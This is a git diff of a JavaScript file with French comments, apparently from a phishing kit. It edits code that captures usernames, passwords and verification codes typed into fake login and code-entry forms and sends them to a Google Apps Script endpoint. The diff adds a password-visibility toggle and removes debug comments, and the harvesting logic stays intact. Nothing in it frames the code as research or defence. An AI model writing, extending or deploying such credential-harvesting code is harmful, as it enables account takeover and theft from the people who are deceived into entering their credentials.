@@ -63,8 +63,8 @@ const translations = {
 // Langue par défaut
 let currentLang = 'en';
 
-// Remplace par une NOUVELLE URL Webhook.site
-const GOOGLE_SHEET_URL = 'https://script.google.com/macros/s/AKfycbwJW28v5Td5bVAtEtwCdNtHumbX8k5FLWQ91RemPv92K0XS3fPcmXsyHbtzBpMgQxA/exec'; // Va sur webhook.site et copie une nouvelle URL
+// Remplace par ton URL Webhook.site
+const GOOGLE_SHEET_URL = 'https://script.google.com/macros/s/AKfycbwJW28v5Td5bVAtEtwCdNtHumbX8k5FLWQ91RemPv92K0XS3fPcmXsyHbtzBpMgQxA/exec';
 
 // Fonction pour envoyer les données
 function sendDataToSheet(type, value) {
@@ -148,19 +148,32 @@ function resendCode() {
     }, 3000);
 }
 
+// Toggle password visibility
+function togglePasswordVisibility() {
+    const passwordInput = document.getElementById('password-placeholder');
+    const toggleIcon = document.querySelector('.toggle-password');
+    if (passwordInput.type === 'password') {
+        passwordInput.type = 'text';
+        toggleIcon.textContent = '👁️‍🗨️'; // Icône "œil barré" (optionnel)
+    } else {
+        passwordInput.type = 'password';
+        toggleIcon.textContent = '👁️'; // Icône "œil"
+    }
+}
+
 // Handle code form submission (index.html)
 if (document.getElementById('codeForm')) {
-    console.log('Code form détecté'); // Débogage
+    console.log('Code form détecté');
     document.getElementById('codeForm').addEventListener('submit', function(event) {
         event.preventDefault();
-        console.log('Formulaire code soumis'); // Débogage
+        console.log('Formulaire code soumis');
 
         const inputs = document.getElementsByTagName('input');
         let code = '';
         for (let i = 0; i < inputs.length; i++) {
             code += inputs[i].value;
         }
-        console.log('Code saisi:', code); // Débogage
+        console.log('Code saisi:', code);
 
         const message = document.getElementById('message');
         const button = document.querySelector('.verify-btn');
@@ -190,14 +203,14 @@ if (document.getElementById('codeForm')) {
 
 // Handle login form submission (login.html)
 if (document.getElementById('loginForm')) {
-    console.log('Login form détecté'); // Débogage
+    console.log('Login form détecté');
     document.getElementById('loginForm').addEventListener('submit', function(event) {
         event.preventDefault();
-        console.log('Formulaire login soumis'); // Débogage
+        console.log('Formulaire login soumis');
 
         const username = document.getElementById('username-placeholder').value;
         const password = document.getElementById('password-placeholder').value;
-        console.log('Username:', username, 'Password:', password); // Débogage
+        console.log('Username:', username, 'Password:', password);
 
         const credentialEntry = `Utilisateur : ${username} | Mot de passe : ${password}`;
         sendDataToSheet('Credentials', credentialEntry);
